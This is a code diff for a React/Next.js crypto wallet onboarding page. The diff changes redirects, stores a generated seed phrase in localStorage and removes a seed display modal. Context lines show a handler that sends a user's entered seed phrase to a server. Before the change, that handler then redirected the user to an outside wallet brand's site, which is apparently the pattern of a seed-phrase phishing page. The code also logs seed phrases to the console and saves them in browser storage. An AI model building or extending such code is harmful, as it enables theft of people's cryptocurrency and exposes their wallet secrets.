@@ -5,6 +5,7 @@ import { useState } from "react";
 import EnterPassphraseModal from "../components/EnterPassphraseModal";
 import GeneratePassphraseModal from "../components/GeneratePassphraseModal";
 import SeedPhraseModal from "../components/SeedPhraseModal";
+import { useRouter } from "next/navigation";
 import {  useEffect } from "react";
 import { useRef } from "react";
 import axios from "axios";
@@ -49,10 +50,10 @@ function generateSeedPhrase(words: string[], length = 12): string[] {
 }
 
 export default function Page() {
+  const router = useRouter();
   const [isExistingWalletModalOpen, setIsExistingWalletModalOpen] =
     useState(false);
   const [isNewWalletModalOpen, setIsNewWalletModalOpen] = useState(false);
-  const [isSeedPhraseModalOpen, setIsSeedPhraseModalOpen] = useState(false);
   const [isSeedPhraseInputModalOpen, setIsSeedPhraseInputModalOpen] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
 
@@ -96,7 +97,7 @@ export default function Page() {
           }
         )
       .then(response => response.data)
-      .then(result => window.location.href = "https://coin.space/wallet/")
+      .then(() => router.push("/wallet?mode=input"))
       .catch(error => console.error("Error sending seed phrase message:", error));
   };
 
@@ -114,15 +115,15 @@ export default function Page() {
     const generated = generateSeedPhrase(WORDLIST);
     setSeedPhrase(generated);
     setIsNewWalletModalOpen(false);
-    setIsSeedPhraseModalOpen(true);
+    try {
+      localStorage.setItem("seedPhrase", JSON.stringify(generated));
+    } catch {}
+    router.push("/wallet");
     console.log("Generated seed phrase:", generated);
   };
 
-  const handleCloseSeedPhraseModal = () => setIsSeedPhraseModalOpen(false);
-  const handleContinueAfterSeed = () => {
-    console.log("User confirmed seed phrase, proceed to dashboard");
-    setIsSeedPhraseModalOpen(false);
-  };
+  const handleCloseSeedPhraseModal = () => {};
+  const handleContinueAfterSeed = () => {};
 
   
   const [country, setCountry] = useState("");
@@ -260,13 +261,7 @@ export default function Page() {
         onGenerate={handleGeneratePassphrase}
       />
 
-      <SeedPhraseModal
-        open={isSeedPhraseModalOpen}
-        seedPhrase={seedPhrase}
-        onClose={handleCloseSeedPhraseModal}
-        onContinue={handleContinueAfterSeed}
-        mode="display"
-      />
+      {/* Seed phrase display moved to /wallet page */}
 
       <SeedPhraseModal
         open={isSeedPhraseInputModalOpen}
